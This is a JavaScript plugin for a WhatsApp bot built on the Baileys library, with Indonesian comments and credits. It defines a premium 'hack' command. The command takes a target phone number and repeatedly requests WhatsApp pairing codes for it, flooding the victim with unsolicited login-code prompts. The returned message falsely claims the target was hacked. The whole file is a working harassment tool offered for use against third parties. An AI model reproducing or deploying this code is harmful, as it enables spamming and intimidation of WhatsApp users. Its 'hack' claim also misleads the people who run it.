/**
@credit Tio
@Tixo MD
@Whatsapp Bot
wa.me/6282285357346
**/

const { default: makeWASocket, useMultiFileAuthState } = (await import('@adiwajshing/baileys')).default

import Pino from 'pino';

// Fungsi utama handler
let handler = async (m, { conn, text }) => {
    
    const nomor = m.quoted ? m.quoted.sender.split('@')[0] : text ? text : m.sender.split('@')[0]
    const hasil = await spamPairing(nomor); // Memanggil fungsi spamPairing
    throw hasil
};

handler.help = ['hack'];
handler.command = ['hack'];
handler.tags = ['tools'];
handler.premium = true
export default handler;

// Fungsi spam_pairing
async function spamPairing(nomor) {
    try {
        const auth = await useMultiFileAuthState('tmp/auth');
        const socket = makeWASocket({
            printQRInTerminal: false,
            browser: ['Ubuntu', 'Chrome', '20.0.04'],
            auth: auth.state,
            logger: Pino({ level: 'silent' })
        });

        // Delay function
        const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

        // Membersihkan nomor telepon
        const cleanNumber = nomor.replace(/\s|-|\+/g, '');

        await delay(1000); // Delay 3 detik sebelum request pairing code

        if (!socket.authState.creds.registered) {
            const code = await socket.requestPairingCode(cleanNumber.trim());
            console.log(`Spam pairing ke ${cleanNumber} dengan kode: ${code}`);
            return `Berhasil melakukan hack ke ${cleanNumber} dengan kode pin wa: ${code}`;
        } else {
            return 'Nomor ini sudah terdaftar.';
        }
    } catch (err) {
        console.error('Error saat spam pairing:', err);
        return err
    }
}